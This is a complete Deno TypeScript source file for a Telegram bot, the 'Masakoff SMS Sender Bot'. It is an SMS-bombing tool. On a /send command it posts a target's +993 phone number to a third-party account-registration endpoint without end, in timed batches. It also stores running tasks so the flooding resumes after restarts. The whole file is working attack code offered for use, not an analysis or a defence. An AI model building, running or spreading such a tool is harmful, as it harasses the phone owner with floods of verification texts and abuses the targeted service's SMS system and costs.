// main.ts
// 💥 Masakoff SMS Sender Bot (Deno)
// 🚀 Created by @Masakoff | FlapsterMinerManager
// ♾️ Hardened for long runs: persistent tasks, instant /stop, robust error handling

import { serve } from "https://deno.land/std@0.224.0/http/server.ts";
import { delay } from "https://deno.land/std@0.224.0/async/delay.ts";

if (!Deno.env.get("BOT_TOKEN")) throw new Error("❌ BOT_TOKEN env var is required");
const TOKEN = Deno.env.get("BOT_TOKEN")!;
const API = `https://api.telegram.org/bot${TOKEN}`;
const SECRET_PATH = "/masakoffvpnhelper";
const ADMIN_USERNAME = "Masakoff";

// Open Deno KV for persistence (survive restarts)
const kv = await Deno.openKv();

// In-memory registry of running tasks
const activeTasks = new Map<string, { stop: boolean }>();

// ---------- Utility helpers ----------
async function sendMessage(chatId: string, text: string, options: any = {}) {
  try {
    await fetch(`${API}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text, ...options }),
    });
  } catch (e) {
    // Always log; do not throw (we want the bot to continue)
    console.error("sendMessage error:", e);
  }
}

async function sendPostRequest(url: string, headers: Record<string, string>, data: Record<string, any>) {
  try {
    const resp = await fetch(url, { method: "POST", headers, body: JSON.stringify(data) });
    return resp.ok; // accept 200..299
  } catch (e) {
    console.error("sendPostRequest error:", e);
    return false;
  }
}

// Interruptible sleep that checks task.stop regularly
async function sleepInterruptible(totalMs: number, task: { stop: boolean }, chunkMs = 250) {
  const start = Date.now();
  while (Date.now() - start < totalMs) {
    if (task.stop) return false;
    const remaining = totalMs - (Date.now() - start);
    await delay(Math.min(chunkMs, remaining));
  }
  return true;
}

// ---------- SMS sending task ----------
async function sendSMS(phoneNumber: string, chatId: string) {
  // Prevent duplicate tasks for same chat
  if (activeTasks.has(chatId)) {
    await sendMessage(chatId, "⚠️ A task is already running for this chat.");
    return;
  }

  const task = { stop: false };
  activeTasks.set(chatId, task);

  // Persist running state to KV so the bot can restore after restart
  try {
    await kv.set(["active", chatId], { phoneNumber, running: true });
  } catch (e) {
    console.error("KV set error:", e);
  }

  const requestsData = [
    {
      url: "https://api.saray.tm/api/v1/accounts",
      headers: {
        "Accept": "application/json",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "api.saray.tm",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "User-Agent": "okhttp/4.12.0",
      },
      data: { phone: `+993${phoneNumber}` },
    },
  ];

  let count = 0;
  await sendMessage(chatId, `📱 Starting SMS sending to +993${phoneNumber} 🔥`);

  try {
    outer: while (!task.stop) {
      for (let batch = 0; batch < 3; batch++) {
        if (task.stop) break outer;
        count++;

        for (const req of requestsData) {
          if (task.stop) break outer;
          // Send a short status update
          await sendMessage(chatId, `📤 Sending SMS #${count} to +993${phoneNumber}...`);

          const success = await sendPostRequest(req.url, req.headers, req.data);
          if (task.stop) break outer;

          // Inform about result (keep messages concise)
          await sendMessage(chatId, success ? "✅ Sent successfully!" : "⚠️ Failed to send (will continue).");

          // 5s interruptible sleep between each SMS
          const ok5 = await sleepInterruptible(5000, task, 250);
          if (!ok5) break outer;
        }
      }

      if (task.stop) break;

      // After a block of 3 messages, wait 45s (interruptible)
      await sendMessage(chatId, "⏳ Batch of 3 SMS completed. Waiting 45 seconds before next batch...");
      const ok45 = await sleepInterruptible(45000, task, 250);
      if (!ok45) break;
    }
  } catch (e) {
    // Catch any unexpected error inside task loop
    console.error("sendSMS task error:", e);
    await sendMessage(chatId, `❗ Task encountered an error: ${String(e)}`);
  } finally {
    // Ensure cleanup always runs
    activeTasks.delete(chatId);
    try {
      // Remove persisted KV entry for this chat
      await kv.delete(["active", chatId]);
    } catch (e) {
      console.error("KV delete error:", e);
    }
    await sendMessage(chatId, "⏹ SMS sending stopped. Thank you! 🎉");
  }
}

// ---------- Restore tasks from KV on startup ----------
async function restoreRunningTasks() {
  try {
    console.log("🔄 Restoring tasks from KV (if any)...");
    for await (const entry of kv.list<{ phoneNumber: string; running: boolean }>({ prefix: ["active"] })) {
      // entry.key is an array like ["active", "<chatId>"]
      const keyParts = entry.key as unknown as Array<string>;
      const storedChatId = String(keyParts[1]);
      const value = entry.value;
      if (!value?.running) continue;
      if (activeTasks.has(storedChatId)) continue; // already running

      // Kick off the task in background (do not await here)
      console.log(`♻️ Restoring SMS task for chat ${storedChatId} (phone: ${value.phoneNumber})`);
      sendSMS(value.phoneNumber, storedChatId).catch((e) => {
        console.error("Restored task error:", e);
      });
    }
  } catch (e) {
    console.error("Error restoring tasks:", e);
  }
}
restoreRunningTasks().catch(console.error);

// ---------- Helper: stop ALL tasks and clear KV ----------
// Stops all in-memory tasks and deletes KV entries under ["active"]
async function stopAllTasks(fromChatId?: string) {
  if (activeTasks.size === 0) return;

  // set stop flag for all in-memory tasks
  for (const task of activeTasks.values()) task.stop = true;

  // delete all active/* entries in KV
  try {
    for await (const entry of kv.list({ prefix: ["active"] })) {
      await kv.delete(entry.key as readonly string[]);
    }
  } catch (e) {
    console.error("Error deleting active tasks from KV:", e);
  }

  // Notify the caller chat (optional)
  if (fromChatId) {
    await sendMessage(fromChatId, "🛑 Stop signal sent to all tasks. They will halt shortly.");
  }
}

// ---------- Global error handlers (do not crash) ----------
addEventListener("unhandledrejection", (ev) => {
  console.error("UnhandledPromiseRejection:", ev.reason);
});
addEventListener("error", (ev) => {
  console.error("GlobalError:", ev.error ?? ev.message);
});

// ---------- Webhook server ----------
serve(async (req) => {
  try {
    if (req.method !== "POST" || new URL(req.url).pathname !== SECRET_PATH) {
      return new Response("Invalid request ❌", { status: 400 });
    }

    const update = await req.json().catch(() => null);
    if (!update?.message || update.message.chat?.type !== "private") {
      return new Response("OK");
    }

    const chatId = String(update.message.chat.id);
    const text = (update.message.text ?? "").trim();
    const username = update.message.from?.username ?? "";

    // Admin check
    if (username !== ADMIN_USERNAME) {
      await sendMessage(chatId, "🚫 Access denied! This bot is for @Masakoff only 👑");
      return new Response("OK");
    }

    if (text.startsWith("/start")) {
      await sendMessage(
        chatId,
        "👋 Welcome to the 💥 Masakoff SMS Sender Bot 💥\n\n" +
          "📲 Commands:\n" +
          "• /send <number> — start sending SMS (example: /send 61234567)\n" +
          "• /stop — stop ALL sending instantly ⛔\n\n" +
          "✨ Created by @Masakoff",
      );
    } else if (text.startsWith("/send")) {
      const parts = text.split(/\s+/);
      if (parts.length < 2 || !parts[1]) {
        await sendMessage(chatId, "⚠️ Please provide a phone number. Example: /send 61234567");
      } else {
        const phoneNumber = parts[1].replace(/^\+993/, "").trim();
        if (!/^\d{7,15}$/.test(phoneNumber)) {
          await sendMessage(chatId, "⚠️ Phone number looks invalid. Provide digits only, e.g. 61234567");
        } else if (activeTasks.has(chatId)) {
          await sendMessage(chatId, "⚠️ A task is already running for this chat. Use /stop to stop all tasks first.");
        } else {
          // start the task in background (do not await to keep HTTP fast)
          sendSMS(phoneNumber, chatId).catch((e) => {
            console.error("sendSMS runtime error:", e);
            sendMessage(chatId, `❗ Failed to start sending: ${String(e)}`);
          });
          await sendMessage(chatId, `🚀 Task starting for +993${phoneNumber}. I'll keep you updated.`);
        }
      }
    } else if (text.startsWith("/stop")) {
      if (activeTasks.size === 0) {
        await sendMessage(chatId, "ℹ️ No active tasks found to stop.");
      } else {
        await stopAllTasks(chatId);
      }
    } else {
      await sendMessage(chatId, "❓ Unknown command. Try /start, /send <number>, or /stop.");
    }
  } catch (e) {
    console.error("Webhook handler error:", e);
  }

  return new Response("OK");
});








